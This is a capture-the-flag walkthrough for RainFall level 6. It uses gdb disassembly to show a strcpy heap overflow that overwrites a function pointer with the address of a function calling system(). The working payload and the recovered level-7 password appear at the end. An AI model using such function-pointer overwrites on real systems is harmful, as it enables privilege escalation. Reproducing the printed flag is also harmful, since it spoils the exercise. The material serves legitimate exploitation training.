# Level 6

- We login as user level6:
```
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
```

```
level6@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
level6@RainFall:~$ gdb level6
```

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   %ebp
   0x0804847d <+1>:     mov    %esp,%ebp
   0x0804847f <+3>:     and    $0xfffffff0,%esp
   0x08048482 <+6>:     sub    $0x20,%esp
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
```


- Let's identify most important orders:
```
   0x08048485 <+9>:     movl   $0x40,(%esp)
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    %eax,0x1c(%esp)
```
>Allocate a block of memory of 0x40 (64 in decimal) bytes in the heap. Then, store the addresses of the allocated memory blocks in the stack (at `0x1c(%esp)`).

```
   0x08048495 <+25>:    movl   $0x4,(%esp)
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    %eax,0x18(%esp)
```
>Allocate a block of memory of 0x4 (4 in decimal) bytes in the heap. Then, store the addresses of the allocated memory blocks in the stack (at `0x18(%esp)`).

```
   0x080484a5 <+41>:    mov    $0x8048468,%edx
   0x080484aa <+46>:    mov    0x18(%esp),%eax
   0x080484ae <+50>:    mov    %edx,(%eax)
```
>`0x8048468 <m>: 0x83e58955`

>Put the address of `<m>` in the second memory zone allocated by malloc (the one with 4 bytes whose address is stored in `0x18(%esp)`).

```
   0x080484b0 <+52>:    mov    0xc(%ebp),%eax
   0x080484b3 <+55>:    add    $0x4,%eax
   0x080484b6 <+58>:    mov    (%eax),%eax
   0x080484b8 <+60>:    mov    %eax,%edx
   0x080484ba <+62>:    mov    0x1c(%esp),%eax
   0x080484be <+66>:    mov    %edx,0x4(%esp)
   0x080484c2 <+70>:    mov    %eax,(%esp)
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
```
>Place the address of the first parameter given to the program (located at `0xc(%ebp) + 0x4`) into the `edx` register.

>Copy the content of the first parameter given to the program into the first memory area allocated by malloc (the one with 64 bytes, whose address is stored at `0x1c(%esp)`).

```
   0x080484ca <+78>:    mov    0x18(%esp),%eax
   0x080484ce <+82>:    mov    (%eax),%eax
   0x080484d0 <+84>:    call   *%eax
```
>Attempt to execute the function whose starting address is stored at `0x18(%esp)`.


- Thus, the program attempt to execute the function `<m>`:
```
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x08048454  n
0x08048468  m
0x0804847c  main
...
```

```
Dump of assembler code for function m:
   0x08048468 <+0>:     push   %ebp
   0x08048469 <+1>:     mov    %esp,%ebp
   0x0804846b <+3>:     sub    $0x18,%esp
   0x0804846e <+6>:     movl   $0x80485d1,(%esp)
   0x08048475 <+13>:    call   0x8048360 <puts@plt>
   0x0804847a <+18>:    leave
   0x0804847b <+19>:    ret
End of assembler dump.
```
>`0x80485d1: "Nope"`

>This function prints "Nope".

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   %ebp
   0x08048455 <+1>:     mov    %esp,%ebp
   0x08048457 <+3>:     sub    $0x18,%esp
   0x0804845a <+6>:     movl   $0x80485b0,(%esp)
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```
>`0x80485b0: "/bin/cat /home/user/level7/.pass"`

>This function prints our flag.


- Instead of the function `<m>`, we would like to execute the function `<n>`.
Given that the memory area that stores the address of the function to be executed is allocated on the heap just after the memory area that should receive our input, and since `strcpy` copies the entire source into the destination, we only need to know from how many characters the address of this function begins to be rewritten, and write the address of function `<n>` in its place.
```
(gdb) b*0x080484d0
```

```
(gdb) r $(python -c "print 'a'*72 + 'BBBBcccc'")
...
(gdb) x $eax
0x42424242:      <Address 0x42424242 out of bounds>
```

```
(gdb) r $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
...
(gdb) x/i $eax
  0x8048454 <n>:       push   %ebp
```

```
level6@RainFall:~$ ./level6 $(python -c "print 'a'*72 + '\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```